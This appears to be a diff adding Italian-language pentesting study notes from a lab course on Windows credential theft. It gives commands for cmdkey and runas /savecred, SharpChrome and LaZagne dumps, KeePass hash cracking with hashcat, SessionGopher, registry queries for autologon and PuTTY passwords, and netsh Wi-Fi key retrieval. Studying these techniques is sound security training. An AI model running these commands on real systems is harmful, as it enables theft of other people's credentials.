@@ -1063,5 +1063,110 @@ si puo' anche usare il comando strings per vedere la roba
 C:\ProgramData\Configs\*
 C:\Program Files\Windows PowerShell\*
 ```
+# Further Credential Theft
+
+## Cmdkey saved credentials
+il comando **cmdkey** si puo' usare per creare list ed eliminare stored password e username. Alcuni utenti vogliono storare credenziali per usarle senza inserire le password.
+
+```
+C:\htb> cmdkey /list
+
+    Target: LegacyGeneric:target=TERMSRV/SQL01
+    Type: Generic
+    User: inlanefreight\bob
+```
+### Runas commands as another User
+Possiamo provare a riusare le credenziali usando **runas**, per mandarci una revshell con un utente.
+
+`PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"` runnare il comando con le savecred
+
+## Browser Credentials
+
+Spesso gli utenti storano le credenziali nei loro browser per i siti che visitano spesso.
+Possiamo usare un tool come https://github.com/GhostPack/SharpDPAPI per retrievare cookie, password e login da Google Chrome.
+
+`PS C:\htb> .\SharpChrome.exe logins /unprotect`
+
+## Password Managers
+Molte aziende danno ai propri utenti dei password manager.
+Avere accesso a un password manager ci potrebbe dare accesso a privilegi altissimi.
+Possiamo avere accesso a password manager tramite Password Reuse o guessing weak/common passwords.
+
+Ad esempio se si usa **KeePass** come password manager lui stora le password in un databse **.kdbx**  criptato con una password. 
+Potremmo usare tool come **hashcat o keepass2john** per craccare.
+
+`j4k1dibe@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx ` 
+
+`j4k1dibe@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt` 13400 e' la hash mode per KeePass.
 
 
+
+## Email
+Se abbiamo accesso ad un domain-joined system nel contesto di domain user con una MIcrosoft Exchange Inbox possiamo provare a cercare la user mail con termini come pass, creds, credentials usando il tool **MailSNiper** (https://github.com/dafthack/MailSniper)
+
+## More Fun with Credentials
+
+Quando tutto fallisce possiamo runnare il tool **LaZagne** (https://github.com/AlessandroZ/LaZagne) per retrievre credenziali da una grande gamma di software come browser, chat, mem dump etc. etc.
+
+per runnare tutti i moduli di LaZagne: 
+`PS C:\htb> .\lazagne.exe all`
+
+
+## Even More Fun with Credentials
+We can use SessionGopher(https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. 
+
+cerca le HKEY_USERS per tutti gli utenti che hanno loggato in un domain-joined host.
+
+```
+PS C:\htb> Import-Module .\SessionGopher.ps1
+ 
+PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
+```
+
+## Clear-Text Password Storage in the Registry
+Alcuni programmi e configurazioni windows storano password in clear text nei registri di istema.
+
+### Windows Autologon
+Windows autologon e' una feature che permette di configurare il proprio Windows OS per loggare automaticamente in un utente specifico, senza richiedere input di username paswsord allo startup.
+
+Se sta feature e' abilitat allora **username e password stanno in cleartext nei registri**.
+
+`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
+
+The typical configuration of an Autologon account involves the manual setting of the following registry keys:
+
+- AdminAutoLogon - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
+- DefaultUserName - Holds the value of the username of the account that will automatically log on.
+- DefaultPassword - Holds the value of the password for the user account specified previously.
+
+`C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
+
+### Putty
+Putty quando si salva una sessione le credenziali sono storate nei registri. in clear text
+
+`Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>`
+
+Note that the access controls for this specific registry key are tied to the user account that configured and saved the session.
+Therefore, in order to see it, we would need to be logged in as that user and search the HKEY_CURRENT_USER hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in HKEY_USERS.
+
+trovo le sessioni salvate:
+```
+PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+
+HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+```
+
+`PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh`
+
+
+## WiFi Passwords
+
+### Viewing Saved Wireless Networks
+Se otteniamo local admin access ad una macchina con una scheda wireless possiamo listare tutte le reti wireless a cui ci siamo connessi
+
+`C:\htb> netsh wlan show profile`
+
+### Retrieving saved Wireless Passwords
+spesso possiamo prendere le Pre-Shared key salvate
+
+`C:\htb> netsh wlan show profile nome_rete key=clear`
